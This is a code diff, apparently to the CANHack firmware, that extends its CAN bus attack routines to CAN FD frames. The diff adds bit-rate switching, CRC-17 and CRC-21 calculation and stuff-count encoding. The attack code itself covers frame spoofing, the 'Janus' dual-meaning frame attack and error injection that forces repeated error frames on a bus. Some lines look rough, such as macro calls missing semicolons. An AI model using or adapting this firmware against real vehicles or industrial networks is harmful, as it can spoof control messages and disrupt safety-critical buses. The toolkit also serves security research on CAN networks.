@@ -36,6 +36,7 @@ struct canhack;
 
 // This is the CAN frame bit pattern that will be transmitted after observing 11 idle bits
 struct canhack {
+
     canhack_frame_t can_frame1;                 // CAN frame shared with API
     canhack_frame_t can_frame2;                 // CAN frame shared with API
 
@@ -52,6 +53,7 @@ struct canhack {
         uint32_t attack_cntdn;
         uint32_t dominant_bit_cntdn;
     } attack_parameters;
+    
 };
 
 struct canhack canhack;
@@ -69,7 +71,7 @@ TIME_CRITICAL void canhack_stop(void)
 
 // Returns true if should re-enter arbitration due to lost arbitration and/or error.
 // Returns false if sent
-TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint8_t tx_index, canhack_frame_t *frame)
+TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint16_t tx_index, canhack_frame_t *frame)
 {
     ctr_t now;
     uint32_t rx;
@@ -78,46 +80,100 @@ TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *
 
     for (;;) {
         now = GET_CLOCK();
+
         // Bit end is scanned first because it needs to execute as close to the time as possible
         if (REACHED(now, bit_end)) {
             SET_CAN_TX(tx);
             bit_end = ADVANCE(bit_end, BIT_TIME);
+            
+            // Fast data switch
+            if ((tx_index == frame->brs_bit + 1) & tx) {
+                bit_end = bit_end - SAMPLE_TO_BIT_END_FD;
+                sample_point = bit_end - SAMPLE_TO_BIT_END_FD;
+
+                cur_tx = tx;
+                tx = frame->tx_bitstream[tx_index++];
+
+                for (;;) {
+                    now = GET_CLOCK();
+
+                    // Bit end is scanned first because it needs to execute as close to the time as possible
+                    if (REACHED(now, bit_end)) {
+                        SET_CAN_TX(tx);
+                        bit_end = ADVANCE(bit_end, BIT_TIME_FD);
+
+                        if (tx_index >= (frame->last_crc_bit + 2)) {
+                            bit_end = bit_end - SAMPLE_TO_BIT_END_FD + SAMPLE_TO_BIT_END;
+                            sample_point = bit_end - SAMPLE_TO_BIT_END;
+
+                            cur_tx = tx;
+                            tx = frame->tx_bitstream[tx_index++];
+
+                            break;
+                        }
+
+                        // The next bit is set up after the time because the critical I/O operation has taken place now
+                        cur_tx = tx;
+                        tx = frame->tx_bitstream[tx_index++];
+                        
+                    }
+
+                    if (REACHED(now, sample_point)) {
+                        rx = GET_CAN_RX();
+                        if (rx != cur_tx) {
+                                // If arbitration then lost, or an error, then give up and go back to SOF
+                                SET_CAN_TX_REC()
+                                return true;
+                        }
+                        sample_point = ADVANCE(sample_point, BIT_TIME_FD);
+                    }
+
+                    if (canhack.canhack_timeout-- == 0) {
+                        return false;
+                    }
+                }
+            }
 
             // The next bit is set up after the time because the critical I/O operation has taken place now
             cur_tx = tx;
             tx = frame->tx_bitstream[tx_index++];
-
-            if ((tx_index >= frame->tx_bits)) {
+            
+            if (tx_index >= (frame->last_eof_bit + 3)) {
                 // Finished
                 SET_CAN_TX_REC();
                 canhack_p->sent = true;
                 return false;
             }
         }
+
         if (REACHED(now, sample_point)) {
             rx = GET_CAN_RX();
             if (rx != cur_tx) {
                     // If arbitration then lost, or an error, then give up and go back to SOF
-                    SET_CAN_TX_REC();
+                    SET_CAN_TX_REC()
                     return true;
             }
             sample_point = ADVANCE(sample_point, BIT_TIME);
         }
+
         if (canhack.canhack_timeout-- == 0) {
-            SET_CAN_TX_REC();
             return false;
         }
     }
 }
 
 // Sends a sequence of bits, returns true if lost arbitration or an error
-TIME_CRITICAL bool send_janus_bits(ctr_t bit_end, uint32_t sync_end, uint32_t split_end, struct canhack *canhack_p, uint8_t tx_index)
+TIME_CRITICAL bool send_janus_bits(ctr_t bit_end, uint32_t sync_time, uint32_t split_time, ctr_t sync_time_fd, ctr_t split_time_fd, struct canhack *canhack_p, uint8_t tx_index)
 {
     ctr_t now;
     uint8_t rx;
     uint8_t tx1;
     uint8_t tx2;
-    uint8_t tx_bits = canhack_p->can_frame1.tx_bits > canhack_p->can_frame2.tx_bits ? canhack_p->can_frame1.tx_bits : canhack_p->can_frame2.tx_bits;
+    uint16_t tx_bits = canhack_p->can_frame1.tx_bits > canhack_p->can_frame2.tx_bits ? canhack_p->can_frame1.tx_bits : canhack_p->can_frame2.tx_bits;
+    uint32_t cur_bit_time = BIT_TIME;
+
+    uint32_t sync_end = ADVANCE(bit_end, sync_time);
+    uint32_t split_end = ADVANCE(bit_end, split_time);
 
     for (;;) {
         for (;;) {
@@ -128,7 +184,7 @@ TIME_CRITICAL bool send_janus_bits(ctr_t bit_end, uint32_t sync_end, uint32_t sp
                 SET_CAN_TX_DOM();
                 // The next bit is set up after the time because the critical I/O operation has taken place now
                 tx1 = canhack_p->can_frame1.tx_bitstream[tx_index];
-                bit_end = ADVANCE(bit_end, BIT_TIME);
+                bit_end = ADVANCE(bit_end, cur_bit_time);
                 break;
             }
             if (canhack.canhack_timeout-- == 0) {
@@ -148,7 +204,17 @@ TIME_CRITICAL bool send_janus_bits(ctr_t bit_end, uint32_t sync_end, uint32_t sp
                     canhack_p->sent = true;
                     return false;
                 }
-                sync_end = ADVANCE(sync_end, BIT_TIME);
+                sync_end = ADVANCE(sync_end, cur_bit_time);
+                if ((tx_index == canhack_p->can_frame1.brs_bit + 1) & tx1) {
+                    cur_bit_time = BIT_TIME_FD;
+                    bit_end = bit_end - SAMPLE_TO_BIT_END_FD;
+                    sync_end = ADVANCE(bit_end, sync_time_fd);
+                }
+                if (tx_index == canhack_p->can_frame1.last_crc_bit + 2) {
+                    cur_bit_time = BIT_TIME;
+                    bit_end = bit_end - SAMPLE_TO_BIT_END_FD + SAMPLE_TO_BIT_END;
+                    sync_end = ADVANCE(bit_end, sync_time);
+                }
                 break;
             }
             if (canhack.canhack_timeout-- == 0) {
@@ -161,7 +227,13 @@ TIME_CRITICAL bool send_janus_bits(ctr_t bit_end, uint32_t sync_end, uint32_t sp
             if (REACHED(now, split_end)) {
                 rx = GET_CAN_RX();
                 SET_CAN_TX(tx2);
-                split_end = ADVANCE(split_end, BIT_TIME);
+                split_end = ADVANCE(split_end, cur_bit_time);
+                if ((tx_index == canhack_p->can_frame2.brs_bit + 1) & tx2) {
+                    split_end = ADVANCE(bit_end, split_time_fd);
+                }
+                if (tx_index == canhack_p->can_frame2.last_crc_bit + 2) {
+                    split_end = ADVANCE(bit_end, split_time);
+                }
                 if (rx != tx1) {
                     SET_CAN_TX_REC();
                     return false;
@@ -200,7 +272,7 @@ TIME_CRITICAL void canhack_send_square_wave(void)
     }
 }
 
-TIME_CRITICAL void canhack_loopback(void)
+TIME_CRITICAL void canhack_loopback(bool fd)
 {
     uint8_t rx = 0U;
     uint8_t prev_rx;
@@ -221,6 +293,9 @@ TIME_CRITICAL void canhack_loopback(void)
     // Echo loopback for a number of bit times, starting with a falling edge
     // This should output on to the debug pin any incoming CAN frame
     uint i = 160U;
+    if (fd) {
+        i = 700U;   // Function has to run longer with fd frames (no brs -> more than 600 bit times)
+    }
     ctr_t bit_end = BIT_TIME;
     RESET_CLOCK(0);
     while(i > 0) {
@@ -245,7 +320,7 @@ TIME_CRITICAL bool canhack_send_frame(uint32_t retries, bool second)
     struct canhack *canhack_p = &canhack;
     canhack_frame_t *can_frame = second ? &canhack_p->can_frame2 : &canhack_p->can_frame1;
     uint32_t bitstream = 0;
-    uint8_t tx_index;
+    uint16_t tx_index;
 
     // Look for 11 recessive bits or 10 recessive bits and a dominant
     uint8_t rx;
@@ -291,7 +366,7 @@ SOF:
 // This sends a Janus frame, with sync_end being the relative time from the start of a bit when
 // the value for the first bit value is asserted, and first_end is the time relative from the start
 // of a bit when the second bit value is asserted.
-TIME_CRITICAL bool canhack_send_janus_frame(ctr_t sync_time, ctr_t split_time, uint32_t retries)
+TIME_CRITICAL bool canhack_send_janus_frame(ctr_t sync_time, ctr_t split_time, ctr_t sync_time_fd, ctr_t split_time_fd, uint32_t retries)
 {
     uint32_t prev_rx = 0;
     struct canhack *canhack_p = &canhack;
@@ -318,12 +393,10 @@ SOF:
             ctr_t bit_end = ADVANCE(sample_point, SAMPLE_TO_BIT_END);
             sample_point = ADVANCE(sample_point, BIT_TIME);
             if ((bitstream & 0x7feU) == 0x7feU) {
-                sync_time = ADVANCE(sync_time, bit_end);
-                split_time = ADVANCE(split_time, bit_end);
                 // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                 // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                 tx_index = rx ^ 1U;
-                if (send_janus_bits(bit_end, sync_time, split_time, canhack_p, tx_index)) {
+                if (send_janus_bits(bit_end, sync_time, split_time, sync_time_fd, split_time_fd, canhack_p, tx_index)) {
                     if (retries--) {
                         bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                         goto SOF;
@@ -360,7 +433,7 @@ static void print_uint64(uint64_t n)
 #endif
 
 // Wait for a targeted frame and then transmit the spoof frame after winning arbitration next
-TIME_CRITICAL bool canhack_spoof_frame(bool janus, ctr_t sync_time, ctr_t split_time, uint32_t retries)
+TIME_CRITICAL bool canhack_spoof_frame(bool janus, ctr_t sync_time, ctr_t split_time, ctr_t sync_time_fd, ctr_t split_time_fd, uint32_t retries)
 {
     uint32_t prev_rx = 1U;
     struct canhack *canhack_p = &canhack;
@@ -388,7 +461,7 @@ TIME_CRITICAL bool canhack_spoof_frame(bool janus, ctr_t sync_time, ctr_t split_
             // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
             if ((bitstream & bitstream_mask) == bitstream_match) {
                 if (janus) {
-                    return canhack_send_janus_frame(sync_time, split_time, retries);
+                    return canhack_send_janus_frame(sync_time, split_time, sync_time_fd, split_time_fd, retries);
                 }
                 else {
                     return canhack_send_frame(retries, false);
@@ -451,6 +524,25 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
     uint64_t bitstream64 = 0;
     uint64_t bitstream64_mask = canhack_p->attack_parameters.bitstream_mask;
     uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;
+    bool brs = canhack_p->can_frame1.brs;
+    uint64_t eof_mask_brs = 1;
+    uint64_t eof_match_brs = 1;
+    uint32_t tmp_eof_mask = eof_mask;
+    uint32_t tmp_eof_match = eof_match;
+    
+    if (brs) {
+        while (tmp_eof_mask) {
+            eof_mask_brs <<= 4;
+            tmp_eof_mask >>= 1;
+        }
+        eof_mask_brs -= 1;      // turn the single set bit at position 4*N into a run of 4*N ones
+
+        while (tmp_eof_match) {
+            eof_match_brs <<= 4;
+            tmp_eof_match >>= 1;
+        }
+        eof_match_brs -= 1;     // likewise: 4x expansion of the recessive match run (was "=- 1", a no-op assignment of -1)
+    }
 
     uint8_t rx;
     RESET_CLOCK(0);
@@ -508,7 +600,20 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
     }
 
     // Now wait for error delimiter / IFS point to inject a bit one or more times
-    uint32_t bitstream32 = 0;
+    uint64_t eof_bitstream = 0;
+    uint64_t eff_eof_mask = eof_mask;
+    uint64_t eff_eof_match = eof_match;
+    uint32_t cur_sample_point_offset = SAMPLE_POINT_OFFSET;
+    uint32_t cur_bit_time = BIT_TIME;
+    if (brs) {
+        cur_sample_point_offset = SAMPLE_POINT_OFFSET_FD;
+        cur_bit_time = BIT_TIME_FD;
+        // 64-bit so the 4x BRS expansion is not truncated: the freeze-doom-loop's 9-bit
+        // EOF mask expands to 36 bits, which overflowed the old 32-bit detection register
+        // and made the attack miss on BRS CAN FD frames.
+        eff_eof_mask = eof_mask_brs;
+        eff_eof_match = eof_match_brs;
+    }
 
     for (uint32_t i = 0; i < repeat; i++) {
         for (;;) {
@@ -516,13 +621,13 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
             rx = GET_CAN_RX();
             if (prev_rx && !rx) {
                 RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
-                sample_point = SAMPLE_POINT_OFFSET;
+                sample_point = cur_sample_point_offset;
             }
             else if (REACHED(now, sample_point)) {
-                bitstream32 = (bitstream32 << 1U) | rx;
-                bit_end = sample_point + SAMPLE_TO_BIT_END;
-                sample_point = ADVANCE(sample_point, BIT_TIME);
-                if ((bitstream32 & eof_mask) == eof_match) {
+                eof_bitstream = (eof_bitstream << 1U) | rx;
+                bit_end = sample_point + cur_sample_point_offset;
+                sample_point = ADVANCE(sample_point, cur_bit_time);
+                if ((eof_bitstream & eff_eof_mask) == eff_eof_match) {
                     // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                     // error passive and do not signal active error frames)
                     for (;;) {
@@ -531,7 +636,7 @@ TIME_CRITICAL bool canhack_error_attack(uint32_t repeat, bool inject_error, uint
                             SET_CAN_TX_DOM();
                             bit_end = ADVANCE(bit_end, BIT_TIME * 7U);
                             sample_point = ADVANCE(sample_point, BIT_TIME * 7U);
-                            bitstream32 = bitstream32 << 7U; // Pseudo-sample of own dominant bits
+                            eof_bitstream = eof_bitstream << 7U; // Pseudo-sample of own dominant bits
                             break;
                         }
                     }
@@ -564,9 +669,13 @@ static void add_raw_bit(uint8_t bit, bool stuff, canhack_frame_t *frame)
 {
     // Record the status of the stuff bit for display purposes
     frame->stuff_bit[frame->tx_bits] = stuff;
+    if (stuff) {
+        frame->stuff_count++;                       // raise stuff count (only needed in fd frames)
+    }
     frame->tx_bitstream[frame->tx_bits++] = bit;
 }
 
+// CRC for normal CAN
 static void do_crc(uint8_t bitval, canhack_frame_t *frame)
 {
     uint32_t bit_14 = (frame->crc_rg & (1U << 14U)) >> 14U;
@@ -578,30 +687,95 @@ static void do_crc(uint8_t bitval, canhack_frame_t *frame)
     }
 }
 
-static void add_bit(uint8_t bit, canhack_frame_t *frame)
+// CRC for CAN FD
+static void do_crc17(uint8_t bitval, canhack_frame_t *frame)
 {
-    if (frame->crcing) {
-        do_crc(bit, frame);
+    uint32_t bit_16 = (frame->crc_rg & (1U << 16U)) >> 16U;
+    uint32_t crc_nxt = bitval ^ bit_16;
+    frame->crc_rg <<= 1U;
+    frame->crc_rg &= 0x1ffffU;
+    if (crc_nxt) {
+        frame->crc_rg ^= 0x3685bU;
     }
+}
+
+// CRC for CAN FD (13+ data bytes)
+static void do_crc21(uint8_t bitval, canhack_frame_t *frame)
+{
+    uint32_t bit_20 = (frame->crc_rg & (1U << 20U)) >> 20U;
+    uint32_t crc_nxt = bitval ^ bit_20;
+    frame->crc_rg <<= 1U;
+    frame->crc_rg &= 0x1fffffU;
+    if (crc_nxt) {
+        frame->crc_rg ^= 0x302899U;
+    }
+}
+
+static void add_bit(uint8_t bit, canhack_frame_t *frame, uint32_t dlc)
+{
+    // Choose crc based on CAN type and dlc
+    if (frame->crcing) {
+        if (frame->fd) {
+            if (dlc > 10) {
+                do_crc21(bit, frame);
+            } 
+            else {
+                do_crc17(bit, frame);
+            }
+        } 
+        else {
+            do_crc(bit, frame);
+        }
+    }
+
+    // Add bit to bitstream and count up for potential stuff bits
     add_raw_bit(bit, false, frame);
     if (bit) {
         frame->recessive_bits++;
         frame->dominant_bits = 0;
-    } else {
+    } 
+    else {
         frame->dominant_bits++;
         frame->recessive_bits = 0;
     }
     if (frame->stuffing) {
+
         if (frame->dominant_bits >= 5U) {
+
+            // stuff bits count into crc in FD frames
+            if (frame->fd) {
+                if (dlc > 10) {
+                    do_crc21(1U, frame);
+                } 
+                else {
+                    do_crc17(1U, frame);
+                }
+            }
+
             add_raw_bit(1U, true, frame);
             frame->dominant_bits = 0;
             frame->recessive_bits = 1U;
         }
+
         if (frame->recessive_bits >= 5U) {
+
+            // stuff bits count into crc in FD frames
+            if (frame->fd) {
+                if (dlc > 10) {
+                    do_crc21(0, frame);
+                } 
+                else {
+                    do_crc17(0, frame);
+                }
+            }
+            
             add_raw_bit(0, true, frame);
             frame->dominant_bits = 1U;
             frame->recessive_bits = 0;
         }
+    } 
+    else {
+
     }
 }
 
@@ -611,19 +785,50 @@ static void add_bit(uint8_t bit, canhack_frame_t *frame)
 //
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame)
+void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame, bool fd, bool brs, bool esi)
 {
-    uint8_t len = rtr ? 0 : (dlc >= 8U ? 8U : dlc); // RTR frames have a DLC of any value but no data field
+    uint8_t len = 0;    // RTR frames have a DLC of any value but no data field
+    if (!rtr) {
+        if (fd & (dlc > 8)) {
+            if (dlc <= 12) {
+                len = 4U * (dlc - 6U);
+            } 
+            else if (dlc == 13) {
+                len = 32;
+            } 
+            else {
+                len = 16U * (dlc - 11U);
+            }
+        } 
+        else {
+            len = dlc >= 8U ? 8U : dlc;
+        }
+    }
 
+    // set crc_rg and crc_len (only needed for fd)
+    uint32_t crc_len = 17U;
+    if (fd) {
+        if (dlc > 10) {
+            crc_len = 21U;
+        }
+        frame->crc_rg = 1U << (crc_len - 1U);
+    } 
+    else {
+        frame->crc_rg = 0;
+    }
+    
+    // init variables
     frame->tx_bits = 0;
-    frame->crc_rg = 0;
     frame->stuffing = true;
     frame->crcing = true;
     frame->dominant_bits = 0;
     frame->recessive_bits = 0;
+    frame->stuff_count = 0;
+    frame->fd = fd;
+    frame->brs = brs;
 
     for (uint32_t i = 0; i < CANHACK_MAX_BITS; i++) {
-        frame->tx_bitstream[i] = 1U;
+        frame->tx_bitstream[i] = 0;
     }
 
     // ID field is:
@@ -631,26 +836,26 @@ void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_
     // {SOF, ID A, SRR = 1, IDE = 1, ID B, RTR, r1, r0) [Extended]
 
     // SOF
-    add_bit(0, frame);
+    add_bit(0, frame, dlc);
 
     // ID A
     id_a <<= 21U;
     for (uint32_t i = 0; i < 11U; i++) {
         if (id_a & 0x80000000U) {
-            add_bit(1U, frame);
+            add_bit(1U, frame, dlc);
         }
         else {
-            add_bit(0, frame);
+            add_bit(0, frame, dlc);
         }
         id_a <<= 1U;
     }
 
-    // RTR/SRR
+    // RTR/SRR (RRS for non extended FD)
     if (rtr || ide) {
-        add_bit(1U, frame);
+        add_bit(1U, frame, dlc); // RTR (if set) or SRR
     }
     else {
-        add_bit(0, frame);
+        add_bit(0, frame, dlc); // RTR or RRS
     }
 
     // The last bit of the arbitration field is the RTR bit if a basic frame; this might be overwritten if IDE = 1
@@ -658,10 +863,10 @@ void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_
 
     // IDE
     if (ide) {
-        add_bit(1U, frame);
+        add_bit(1U, frame, dlc);
     }
     else {
-        add_bit(0, frame);
+        add_bit(0, frame, dlc);
     }
 
     if (ide) {
@@ -669,40 +874,71 @@ void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_
         id_b <<= 14U;
         for (uint32_t i = 0; i < 18U; i++) {
             if (id_b & 0x80000000U) {
-                add_bit(1U, frame);
-            } else {
-                add_bit(0, frame);
+                add_bit(1U, frame, dlc);
+            } 
+            else {
+                add_bit(0, frame, dlc);
             }
             id_b <<= 1U;
         }
-        // RTR
+        // RTR (RRS for fd)
         if (rtr) {
-            add_bit(1U, frame);
+            add_bit(1U, frame, dlc);
         }
         else {
-            add_bit(0, frame);
+            add_bit(0, frame, dlc);
         }
         // The RTR bit is the last bit in the arbitration field if an extended frame
         frame->last_arbitration_bit = frame->tx_bits - 1U;
 
-        // r1
-        add_bit(0, frame);
     }
     else {
         // If IDE = 0 then the last arbitration field bit is the RTR
     }
-    // r0
-    add_bit(0, frame);
+
+    // r1 (FDF in FD frames)
+    if (fd) {
+        add_bit(1U, frame, dlc);
+    } 
+    else if (ide){
+        add_bit(0, frame, dlc);
+    }
+
+    // r0 (res in FD frames)
+    add_bit(0, frame, dlc);
+
+    // Additional bits for FD
+    if (fd) {
+
+        // BRS bit rate switch
+        if (brs) {
+            add_bit(1U, frame, dlc);
+            frame->brs_bit = frame->tx_bits - 1U;
+        } 
+        else {
+            add_bit(0, frame, dlc);
+            frame->brs_bit = CANHACK_MAX_BITS;
+        }
+
+        // ESI error state indicator
+        if (esi) {
+            add_bit(0, frame, dlc);
+        } 
+        else {
+            add_bit(1U, frame, dlc);
+        }
+    }
 
     // DLC
-    dlc <<= 28U;
+    uint32_t dlc_put = dlc << 28U;
     for (uint32_t i = 0; i < 4U; i++) {
-        if (dlc & 0x80000000U) {
-            add_bit(1U, frame);
-        } else {
-            add_bit(0, frame);
+        if (dlc_put & 0x80000000U) {
+            add_bit(1U, frame, dlc);
+        } 
+        else {
+            add_bit(0, frame, dlc);
         }
-        dlc <<= 1U;
+        dlc_put <<= 1U;
     }
     frame->last_dlc_bit = frame->tx_bits - 1U;
 
@@ -710,28 +946,129 @@ void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_
     for (uint32_t i = 0; i < len; i ++) {
         uint8_t byte = data[i];
         for (uint32_t j = 0; j < 8; j++) {
-            if (byte & 0x80U) {
-                add_bit(1U, frame);
+
+            // if the last data bit is a stuff bit, it will be replaced by the first fsb
+            if (fd) {
+                if ((i == len-1) & (j == 7)) {
+                    frame->stuffing = false;
+                }
             }
+            if (byte & 0x80U) {
+                add_bit(1U, frame, dlc);
+            } 
             else {
-                add_bit(0, frame);
+                add_bit(0, frame, dlc);
             }
             byte <<= 1U;
         }
     }
+
     // If the length is 0 then the last data bit is equal to the last DLC bit
     frame->last_data_bit = frame->tx_bits - 1U;
 
-    // CRC
-    frame->crcing = false;
-    uint32_t crc_rg = frame->crc_rg << 17U;
-    for (uint32_t i = 0; i < 15U; i++) {
-        if (crc_rg & 0x80000000U) {
-            add_bit(1U, frame);
-        } else {
-            add_bit(0, frame);
-        }
+    // CRC for CAN
+    if (!fd) {
+        frame->crcing = false;
+        uint32_t crc_rg = frame->crc_rg << 17U;
+        for (uint32_t i = 0; i < 15; i++) {
+            if (crc_rg & 0x80000000U) {
+                add_bit(1U, frame, dlc);
+            } 
+            else {
+                add_bit(0, frame, dlc);
+            }
         crc_rg <<= 1U;
+        }    
+    } 
+    // CRC and STC for FD
+    else {
+
+        // First FSB (last_data_bit adjustment if necessary)
+        if (frame->tx_bitstream[frame->last_data_bit]) {
+            add_raw_bit(0, true, frame);
+            if (frame->dominant_bits == 4) {
+                frame->last_data_bit++;
+            }
+        } 
+        else {
+            add_raw_bit(1U, true, frame);
+            if (frame->recessive_bits == 4) {
+                frame->last_data_bit++;
+            }
+        }
+        frame->stuff_count--;
+
+        // set up gray-coded stuff count
+        uint8_t stc = frame->stuff_count % 8;
+        uint8_t gc_stc;
+        switch(stc) {
+            case 1:
+                gc_stc = 0b00000001;
+                break;
+            case 2:
+                gc_stc = 0b00000011;
+                break;
+            case 3:
+                gc_stc = 0b00000010;
+                break;
+            case 4:
+                gc_stc = 0b00000110;
+                break;
+            case 5:
+                gc_stc = 0b00000111;
+                break;
+            case 6:
+                gc_stc = 0b00000101;
+                break;
+            case 7:
+                gc_stc = 0b00000100;
+                break;
+            default:
+                gc_stc = 0b00000000;
+                break;
+        }
+        uint8_t parity = frame->stuff_count & 0x1U;
+
+        // Stuff Count and Parity
+        for (uint32_t i = 0; i < 3; i++) {
+            if (gc_stc & 0x4U) {
+                add_bit(1U, frame, dlc);
+            } 
+            else {
+                add_bit(0, frame, dlc);
+            }
+            gc_stc <<= 1U;
+        }
+        add_bit(parity, frame, dlc);
+
+        // Second FSB
+        if (parity) {
+            add_raw_bit(0, true, frame);
+        } 
+        else {
+            add_raw_bit(1U, true, frame);
+        }
+
+        // Stop crc
+        frame->crcing = false;
+
+        // Put crc with FSBs
+        uint32_t crc_rg = frame->crc_rg << (32U - crc_len);
+        for (uint32_t i = 0; i < crc_len; i++) {
+            if (crc_rg & 0x80000000U) {
+                add_bit(1U, frame, dlc);
+                if ((i+1)%4 == 0) {
+                    add_raw_bit(0, true, frame);
+                }
+            }
+            else {
+                add_bit(0, frame, dlc);
+                if ((i+1)%4 == 0) {
+                    add_raw_bit(1U, true, frame);
+                }
+            }
+            crc_rg <<= 1U;
+        }
     }
     frame->last_crc_bit = frame->tx_bits - 1U;
 
@@ -739,30 +1076,30 @@ void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_
     frame->stuffing = false;
 
     // CRC delimiter
-    add_bit(1U, frame);
+    add_bit(1U, frame, dlc);
 
     // ACK; we transmit this as a dominant bit to ensure the state machines lock on to the right
     // EOF field; it's mostly moot since if there are no CAN controllers then there is not much
     // hacking to do.
-    add_bit(0, frame);
+    add_bit(0, frame, dlc);
 
     // ACK delimiter
-    add_bit(1U, frame);
+    add_bit(1U, frame, dlc);
 
     // EOF
-    add_bit(1U, frame);
-    add_bit(1U, frame);
-    add_bit(1U, frame);
-    add_bit(1U, frame);
-    add_bit(1U, frame);
-    add_bit(1U, frame);
-    add_bit(1U, frame);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
     frame->last_eof_bit = frame->tx_bits - 1U;
 
     // IFS
-    add_bit(1U, frame);
-    add_bit(1U, frame);
-    add_bit(1U, frame);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
+    add_bit(1U, frame, dlc);
 
     // Set up the matching masks for this CAN frame
     frame->tx_arbitration_bits = frame->last_arbitration_bit + 1U;
@@ -778,7 +1115,7 @@ canhack_frame_t *canhack_get_frame(bool second)
 // Sets the CAN hack masks from frame 1 (frame 2 is only used in the Janus attack)
 void canhack_set_attack_masks(void)
 {
-    canhack.attack_parameters.n_frame_match_bits = canhack.can_frame1.last_arbitration_bit + 1U;
+    canhack.attack_parameters.n_frame_match_bits = canhack.can_frame1.last_arbitration_bit + 2U;
     canhack.attack_parameters.bitstream_mask = (1ULL << (canhack.attack_parameters.n_frame_match_bits + 10U)) - 1ULL;
     canhack.attack_parameters.bitstream_match = 0x3ffULL;
     for (uint32_t i = 0; i < canhack.attack_parameters.n_frame_match_bits; i++) {
@@ -792,4 +1129,3 @@ void canhack_init(void)
     canhack.can_frame1.frame_set = false;
     canhack.can_frame2.frame_set = false;
 }
-
